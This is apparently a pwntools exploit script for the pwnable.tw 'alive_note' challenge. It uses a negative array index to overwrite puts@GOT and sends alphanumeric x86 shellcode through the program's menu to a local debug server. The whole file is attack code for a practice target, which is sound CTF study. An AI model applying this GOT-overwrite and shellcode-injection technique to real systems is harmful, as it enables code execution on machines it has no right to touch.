from pwn import *
context.os     = "linux"
context.arch   = "i386"
context.endian = "little"

note_start = 0x0804A080

puts_got   = 0x0804A020
strlen_got = 0x0804A028
free_got   = 0x0804A014
atoi_got   = 0x0804A034
exit_got   = 0x0804A024
strdup_got = 0x0804A018

target_got = puts_got
target_back = (target_got - note_start)//4

#edx       -> location
#pop&pop D -> pointer to new shellcode, of which the first byte is the loader instruction
as_relocate = """
xor dword ptr [edx+0x35], eax
jne $+0x32
"""

brelocate = asm(as_relocate)
assert(brelocate.isalnum())

#r = process("./alive_note")
r = process(["gdbserver", "localhost:1231", "./alive_note"])
#r = remote("chall.pwnable.tw", port=10201)

r.recvuntil("choice :")
r.sendline("1")
r.recvuntil("Index :")
r.sendline(str(target_back))
r.recvuntil("Name :")
r.sendline(brelocate)

r.interactive()